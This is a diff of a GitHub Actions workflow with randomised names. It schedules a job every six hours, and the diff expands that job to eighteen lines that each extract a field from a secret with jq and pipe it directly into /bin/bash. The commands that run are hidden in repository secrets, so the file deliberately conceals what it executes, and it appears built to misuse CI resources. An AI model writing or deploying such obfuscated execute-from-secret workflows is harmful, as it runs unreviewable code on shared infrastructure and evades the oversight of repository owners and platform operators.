@@ -1,23 +1,34 @@
 name: commissionperturbed
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
-
+    - cron: '40 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: commissionperturbed
         env:
-          k8645: ${{ secrets.k8645 }}
+          sojc6840: ${{ secrets.sojc6840 }}
         run: |
-          echo $k8645 | jq -r .zmyxx61 | /bin/bash
-          echo $ldv36138 | jq -r .ombmm35 | /bin/bash
-          echo $qm41008 | jq -r .ku1 | /bin/bash
-          echo $sejd10503 | jq -r .z44884 | /bin/bash
-          echo $uzdgv7 | jq -r .fppo6 | /bin/bash
-          echo $pab216 | jq -r .zistm00 | /bin/bash
+          echo $sojc6840 | jq -r .isa584 | /bin/bash
+          echo $rmozg4343 | jq -r .lu15789 | /bin/bash
+          echo $jjaf2 | jq -r .ddh4 | /bin/bash
+          echo $uotok4 | jq -r .np0 | /bin/bash
+          echo $ombt18 | jq -r .sgwg6243 | /bin/bash
+          echo $zh739 | jq -r .pojk954 | /bin/bash
+          echo $juqs86 | jq -r .vbw2 | /bin/bash
+          echo $pvao23 | jq -r .vjdl07 | /bin/bash
+          echo $hwt47 | jq -r .kiat9 | /bin/bash
+          echo $sugt947 | jq -r .u52 | /bin/bash
+          echo $qzz115 | jq -r .euue8362 | /bin/bash
+          echo $bhi40485 | jq -r .mi69 | /bin/bash
+          echo $se99306 | jq -r .rs388 | /bin/bash
+          echo $qudva06 | jq -r .cc4861 | /bin/bash
+          echo $tx2 | jq -r .ij0 | /bin/bash
+          echo $oevj983 | jq -r .xmc5936 | /bin/bash
+          echo $dp09160 | jq -r .o678 | /bin/bash
+          echo $iiye09205 | jq -r .itpkw1 | /bin/bash
 
